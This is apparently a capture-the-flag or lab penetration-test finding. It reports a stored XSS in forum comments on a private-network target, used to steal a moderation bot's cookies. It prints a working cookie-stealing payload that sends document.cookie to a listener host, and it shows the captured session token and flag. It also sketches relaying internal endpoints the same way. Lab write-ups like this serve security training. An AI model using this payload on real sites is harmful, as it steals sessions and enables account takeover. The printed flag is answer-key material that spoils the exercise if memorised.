# Finding 05 — Stored XSS in forum comments → moderation bot cookie theft → FLAG 5

**Target:** http://192.168.1.74:4942
**Severity:** Critical
**Status:** Confirmed exploitable
**Flag:** `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`

## Summary

`POST /forum/{thread_id}/comment` stores the `content` field and renders it
unescaped ("HTML is supported for formatting" per the site's own UI copy and
HTML comments). A privileged moderation bot (headless Chrome) visits new/
updated threads with a live session, and its `flag` cookie is **not**
`httpOnly`, so injected JS can read and exfiltrate it (per forum thread
HTML comment: *"the moderation bot opens every thread with a live session...
and a 'flag' cookie that isn't httpOnly"*).

## Steps to reproduce

1. Stand up a listener reachable from the target VM (same LAN):

   ```
   python3 /tmp/xss_listener/server.py   # listens on 0.0.0.0:8888, logs to hits.log
   ```

2. Post a comment on any forum thread while authenticated (any role; `cadet`
   session from Finding 03 was used) with an XSS payload:

   ```
   curl -s -b cookies_jdoe.txt \
     -X POST 'http://192.168.1.74:4942/forum/bbeo32ucx0a65b8/comment' \
     --data-urlencode 'content=<img src=x onerror="fetch(&quot;http://192.168.1.63:8888/xss-hit?c=&quot;+encodeURIComponent(document.cookie))">'
   ```

3. Within ~2 minutes, the moderation bot visits the thread, executes the
   payload, and the listener receives:

   ```
   GET /xss-hit?c=session%3D<jwt>%3B%20flag%3DFLAG%7Bxss_st0r3d_1s_n0t_4_f34tur3_w1l%7D
   User-Agent: Mozilla/5.0 ... HeadlessChrome/120.0.6099.28 ...
   Origin: http://127.0.0.1:4942
   ```

   Decoded cookies: `flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}` and a
   `session` JWT with `login: moderator`, `role: student`.

   Note: the bot requests the app via `http://127.0.0.1:4942` (loopback),
   confirming it runs server-side, inside the VM itself.

## Repro script

See `repro-05-xss-listener.py` (the listener) and `repro-05-post-payload.sh`
in this directory.

## Observations / next steps

- The exfiltrated `session` JWT belongs to the `moderator` account but its
  `role` claim is only `student` — so the bot's actual privilege (if any)
  isn't carried by this cookie's role claim. Worth checking whether
  `moderator`'s real account role (via `/api/users/{moderator_id}`) differs,
  or whether the bot has separate server-side access not reflected in its
  own session.
- This is a reliable "send yourself anything the bot's browser can see"
  primitive — could be reused to probe internal-only endpoints
  (`/internal/config`) *if* the bot's browser can reach them and we inject a
  payload that fetches and relays the response body back to our listener
  (same-origin fetch + exfil, rather than just reading cookies).

## Fix recommendation

- Sanitize/escape all user-supplied HTML in forum content (or render through
  a strict allow-list sanitizer, not raw).
- Mark all session/privileged cookies `httpOnly` (ticket #4201 already filed
  internally per the site's own deploy log — just needs doing).
- Isolate the moderation bot's credentials from anything that would be
  valuable if leaked (least privilege, short-lived tokens).
